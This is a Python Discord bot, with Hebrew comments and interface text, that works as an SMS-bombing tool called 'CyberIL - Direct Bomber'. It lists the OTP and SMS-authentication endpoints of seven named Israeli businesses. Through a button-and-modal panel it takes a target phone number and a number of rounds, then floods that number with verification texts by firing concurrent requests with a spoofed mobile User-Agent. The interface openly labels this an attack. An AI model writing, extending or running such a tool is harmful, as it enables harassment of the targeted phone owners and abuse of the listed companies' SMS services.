import discord
from discord.ext import commands
from discord import app_commands
import aiohttp
import asyncio
import os

# ==================== CONFIG ====================
TOKEN = os.getenv("BOT_TOKEN")

intents = discord.Intents.default()
intents.message_content = True 
intents.members = True

# רשימת ה-APIs שביקשת - מוגדרים לפי הדרישות שלהם
STRONGEST_APIs = [
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": "{{phone}}", "type": "phone", "projectId": "1"}},
    {"name": "Ivory", "url": "https://www.ivory.co.il/mobile/sms_auth", "method": "POST", "data": {"phone": "{{phone}}"}},
    {"name": "Urbanica", "url": "https://www.urbanica-israel.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Renuar", "url": "https://www.renuar.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Dominos", "url": "https://www.dominos.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "BezeqStore", "url": "https://www.bezeqstore.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Mishloha", "url": "https://www.mishloha.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}}
]

active_bombs = {}

# ==================== ENGINE ====================
async def run_attack(session, api, phone, user_id):
    if active_bombs.get(user_id) is False: return
    
    # החלפת הטלפון ב-JSON או ב-Data
    def fix(obj):
        if isinstance(obj, dict): return {k: fix(v) for k, v in obj.items()}
        if isinstance(obj, str): return obj.replace("{{phone}}", phone)
        return obj

    payload = fix(api.get("json"))
    form_data = fix(api.get("data"))

    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
        "Accept": "application/json",
        "Referer": "https://google.com"
    }

    try:
        async with session.request(
            api["method"], 
            api["url"], 
            json=payload, 
            data=form_data,
            headers=headers, 
            timeout=10
        ) as r:
            print(f"Sent to {api['name']} - Status: {r.status}")
            return r.status
    except Exception as e:
        print(f"Error with {api['name']}: {e}")
        return None

# ==================== UI ====================
class BomberModal(discord.ui.Modal, title='🔥 CyberIL - Direct Bomber'):
    phone = discord.ui.TextInput(label='מספר יעד', placeholder='05XXXXXXXX', min_length=10, max_length=10)
    rounds = discord.ui.TextInput(label='סבבים', default='1')

    async def on_submit(self, interaction: discord.Interaction):
        target = self.phone.value
        await interaction.response.send_message(f"🚀 תקיפה ישירה החלה על {target}...", ephemeral=True)
        
        user_id = interaction.user.id
        active_bombs[user_id] = True
        
        async with aiohttp.ClientSession() as session:
            for _ in range(int(self.rounds.value)):
                if active_bombs.get(user_id) is False: break
                tasks = [run_attack(session, api, target, user_id) for api in STRONGEST_APIs]
                await asyncio.gather(*tasks)
                await asyncio.sleep(2)
        
        active_bombs.pop(user_id, None)

class ControlView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 התחל הפצצה", style=discord.ButtonStyle.danger)
    async def start(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BomberModal())

    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.grey)
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_bombs[interaction.user.id] = False
        await interaction.response.send_message("התקיפה הופסקה.", ephemeral=True)

# ==================== BOT ====================
class MyBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix='!', intents=intents)
    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()

@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    await interaction.response.send_message("לוח בקרה - APIs ישראליים חזקים", view=ControlView())

bot.run(TOKEN)
